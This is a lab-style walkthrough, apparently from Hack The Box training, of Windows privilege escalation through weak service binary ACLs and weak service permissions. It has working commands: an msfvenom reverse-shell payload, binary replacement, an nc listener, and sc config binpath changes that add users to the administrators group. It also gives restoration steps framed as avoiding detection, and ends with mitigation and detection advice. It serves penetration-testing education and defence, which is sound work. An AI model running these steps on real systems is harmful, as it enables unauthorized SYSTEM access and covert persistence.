# Windows Privilege Escalation via Weak Service Permissions

## Overview
This walkthrough demonstrates two common privilege escalation techniques on Windows systems by exploiting weak permissions: **Permissive File System ACLs** and **Weak Service Permissions**. These vulnerabilities often occur in third-party applications, custom software, or improperly configured services, allowing standard users to escalate to SYSTEM or Administrator privileges.

## Prerequisites
- Initial access to a Windows system with standard user privileges
- Ability to execute commands (via shell, RDP, or other means)
- Basic familiarity with Windows command line and PowerShell

## Part 1: Exploiting Permissive File System ACLs

### Understanding the Vulnerability
When service binaries have weak Access Control Lists (ACLs), standard users can modify or replace them. Since services often run with SYSTEM privileges, replacing a legitimate service binary with a malicious one results in code execution as SYSTEM when the service starts.

### Step 1: Initial Enumeration with SharpUp

First, use SharpUp to identify potential vulnerabilities:

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

**Key Finding:** The `SecurityService.exe` binary is potentially modifiable.

### Step 2: Verify Permissions with icacls

Confirm the weak permissions using Windows' built-in `icacls` tool:

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Critical Finding:** Both `BUILTIN\Users` and `Everyone` have `(F)` - Full Control permissions on the binary.

### Step 3: Create Malicious Replacement Binary

On your attacker machine, generate a malicious binary with msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o malicious.exe
```

Transfer the malicious binary to the target (using your preferred method - SMB, HTTP, etc.).

### Step 4: Replace the Service Binary

Back up the original binary and replace it with your malicious one:

```cmd
C:\htb> copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" "C:\temp\SecurityService.exe.bak"
C:\htb> copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### Step 5: Start the Service and Receive Shell

Start a listener on your attacker machine:

```bash
nc -lvnp 4444
```

Then start the service on the target:

```cmd
C:\htb> sc start SecurityService
```

**Result:** You receive a reverse shell running as SYSTEM.

## Part 2: Exploiting Weak Service Permissions

### Understanding the Vulnerability
When services have weak permissions, standard users can modify service configurations - including the binary path. By changing the binary path to execute arbitrary commands and restarting the service, those commands run with the service's privileges (often SYSTEM).

### Step 1: Enumeration with SharpUp (Again)

Run SharpUp to identify services with weak permissions:

```cmd
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Step 2: Detailed Permission Analysis with AccessChk

Use Sysinternals AccessChk for detailed service permission analysis:

```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

**Critical Finding:** `NT AUTHORITY\Authenticated Users` has `SERVICE_ALL_ACCESS`, meaning any authenticated user can fully control this service.

### Step 3: Verify Current Privileges

Check if you're already an administrator:

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

**Note:** Your current user (`htb-student` in this example) is NOT in the administrators group.

### Step 4: Modify Service Binary Path

Change the service's binary path to add your user to the administrators group:

```cmd
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

**Alternative Payloads:**
- For reverse shell: `binpath="cmd /c c:\temp\malicious.exe"`
- For creating new admin user: `binpath="cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"`

### Step 5: Trigger the Payload

Stop and start the service to execute the command:

```cmd
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0

C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

**Note:** The service fails to start (expected since we changed the binary path), but the command still executes before the failure.

### Step 6: Verify Privilege Escalation

Check if your user was successfully added to the administrators group:

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

**Success!** Your user (`htb-student`) is now a member of the administrators group.

## Part 3: Cleanup and Restoration

### Restore the Service (Optional but Recommended)

To avoid detection and maintain system stability, restore the service to its original configuration:

```cmd
C:\htb> sc stop WindscribeService
C:\htb> sc config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
[SC] ChangeServiceConfig SUCCESS
C:\htb> sc start WindscribeService
C:\htb> sc query WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Remove Administrative Privileges (If Needed)

```cmd
C:\htb> net localgroup administrators htb-student /delete
```

## Key Tools and Commands Reference

### Enumeration Tools
1. **SharpUp**: `SharpUp.exe audit` - Checks for various privilege escalation vectors
2. **AccessChk**: `accesschk.exe /accepteula -quvcw <service_name>` - Detailed service permission analysis
3. **icacls**: `icacls "<file_path>"` - View file/folder permissions
4. **sc**: `sc query <service_name>` - Service control manager commands

### Critical Commands
- `sc config <service> binpath="<command>"` - Change service binary path
- `sc stop/start <service>` - Control service state
- `net localgroup administrators` - View/Modify local administrators group

## Defense and Mitigation

### For System Administrators:
1. **Follow Principle of Least Privilege**: Services should run with minimum necessary privileges
2. **Regular Permission Audits**: Periodically review service and file permissions
3. **Secure Service Binaries**: Ensure service binaries have restrictive ACLs (SYSTEM and Administrators only)
4. **Use Service Hardening**: Implement service isolation and reduce privileges
5. **Monitor Service Changes**: Alert on unexpected service configuration modifications

### Detection Indicators:
- Unusual service binary modifications
- Service configuration changes (especially binary path)
- Failed service starts followed by successful authentication events
- New users added to privileged groups

## Real-World Example: CVE-2019-1322
The Windows Update Orchestrator Service (UsoSvc) vulnerability allowed service accounts to modify the service binary path and gain SYSTEM privileges, demonstrating how even critical Windows services can be vulnerable to permission weaknesses.

## Conclusion
Weak permissions on services and their binaries represent significant security risks. Regular users can exploit these misconfigurations to gain complete system control. Always audit service permissions, apply the principle of least privilege, and monitor for unauthorized changes to prevent such escalations.

---

*Important: This walkthrough is for educational purposes in authorized penetration testing environments only. Always obtain proper authorization before testing security vulnerabilities.*